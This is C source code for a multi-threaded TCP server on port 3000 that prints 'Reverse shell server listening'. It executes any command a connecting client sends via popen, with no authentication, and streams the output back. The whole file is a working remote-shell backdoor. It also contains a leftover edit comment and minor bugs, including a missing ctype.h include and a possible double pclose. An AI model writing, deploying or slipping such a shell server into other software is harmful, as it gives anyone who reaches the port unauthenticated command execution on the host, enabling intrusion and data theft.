#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 3000
#define CHUNK_SIZE 1024
#define DELIMITER "***" // End-of-message delimiter

// Send data in full even if it is longer than CHUNK_SIZE.
int send_all(int sock, const char *buffer, size_t length)
{
    size_t total_sent = 0;
    while (total_sent < length)
    {
        ssize_t sent = send(sock, buffer + total_sent, length - total_sent, 0);
        if (sent <= 0)
        {
            return -1; // error or connection closed
        }
        total_sent += sent;
    }
    return 0;
}

// Function to check if a string is empty or contains only whitespace
int is_empty_or_whitespace(const char *str)
{
    if (str == NULL)
        return 1;

    while (*str)
    {
        if (!isspace((unsigned char)*str))
            return 0;
        str++;
    }
    return 1;
}

void *client_handler(void *arg)
{
    int client_sock = *(int *)arg;
    free(arg);
    char command[CHUNK_SIZE];
    ssize_t num_read;

    while (1)
    {
        memset(command, 0, sizeof(command));
        num_read = recv(client_sock, command, sizeof(command) - 1, 0);
        if (num_read <= 0)
        {
            perror("recv failed or connection closed");
            break;
        }
        command[num_read] = '\0';

        // Handle exit.
        if (strncmp(command, "exit", 4) == 0)
            break;

        // Handle "cd" command specially.
        char output_buffer[CHUNK_SIZE * 2];
        memset(output_buffer, 0, sizeof(output_buffer));
        if (strncmp(command, "cd ", 3) == 0)
        {
            char *dir = command + 3;
            if (dir[0] == '\0')
                dir = getenv("HOME");
            if (chdir(dir) != 0)
            {
                snprintf(output_buffer, sizeof(output_buffer), "cd: %s: %s\n", dir, strerror(errno));
            }
            else
            {
                char cwd[CHUNK_SIZE];
                if (getcwd(cwd, sizeof(cwd)) != NULL)
                {
                    snprintf(output_buffer, sizeof(output_buffer), "Directory changed to: %s\n", cwd);
                }
                else
                {
                    snprintf(output_buffer, sizeof(output_buffer), "cd: error retrieving current directory\n");
                }
            }
            // Append delimiter to signal end of output.
            strncat(output_buffer, DELIMITER, sizeof(output_buffer) - strlen(output_buffer) - 1);
            if (send_all(client_sock, output_buffer, strlen(output_buffer)) < 0)
                break;
            continue;
        }

        // In the client_handler function, replace the general command handling section:

        // Execute general commands via popen.
        FILE *fp = popen(command, "r");
        if (fp == NULL)
        {
            snprintf(output_buffer, sizeof(output_buffer), "Failed to execute command.\n");
            strncat(output_buffer, DELIMITER, sizeof(output_buffer) - strlen(output_buffer) - 1);
            if (send_all(client_sock, output_buffer, strlen(output_buffer)) < 0)
                break;
            continue;
        }

        // Read output in chunks and send immediately
        char chunk[CHUNK_SIZE];
        while (fgets(chunk, sizeof(chunk), fp) != NULL)
        {
            if (send_all(client_sock, chunk, strlen(chunk)) < 0)
            {
                pclose(fp);
                break;
            }
        }
        pclose(fp);

        // Send the delimiter after all chunks
        if (send_all(client_sock, DELIMITER, strlen(DELIMITER)) < 0)
        {
            break;
        }
    }

    close(client_sock);
    pthread_exit(NULL);
}

int main()
{
    int server_sock, *client_sock_ptr;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);

    if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    memset(&(server_addr.sin_zero), '\0', 8);

    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        perror("bind failed");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    if (listen(server_sock, 5) < 0)
    {
        perror("listen failed");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    printf("Reverse shell server listening on port %d...\n", PORT);

    while (1)
    {
        int *client_sock = malloc(sizeof(int));
        if ((*client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_addr_len)) < 0)
        {
            perror("accept failed");
            free(client_sock);
            continue;
        }
        printf("Connection accepted from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        pthread_t tid;
        if (pthread_create(&tid, NULL, client_handler, client_sock) != 0)
        {
            perror("Failed to create thread");
            close(*client_sock);
            free(client_sock);
            continue;
        }
        pthread_detach(tid);
    }

    close(server_sock);
    return 0;
}